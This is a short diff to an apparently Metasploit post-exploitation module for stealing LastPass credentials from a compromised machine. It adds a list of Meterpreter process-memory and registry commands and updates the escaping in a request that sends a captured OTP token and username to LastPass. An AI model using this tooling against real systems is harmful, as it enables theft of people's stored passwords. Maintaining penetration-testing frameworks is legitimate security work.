@@ -31,7 +31,21 @@ class MetasploitModule < Msf::Post
         'References' => [
           [ 'URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it' ]
         ],
-        'SessionTypes' => %w(meterpreter shell)
+        'SessionTypes' => %w(meterpreter shell),
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+              stdapi_registry_open_key
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        }
       )
     )
   end
@@ -597,7 +611,7 @@ class MetasploitModule < Msf::Post
     # Make request to LastPass
     uri = URI('https://lastpass.com/otp.php')
     request = Net::HTTP::Post.new(uri)
-    request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
+    request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI::DEFAULT_PARSER.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
     request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
     response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }
 
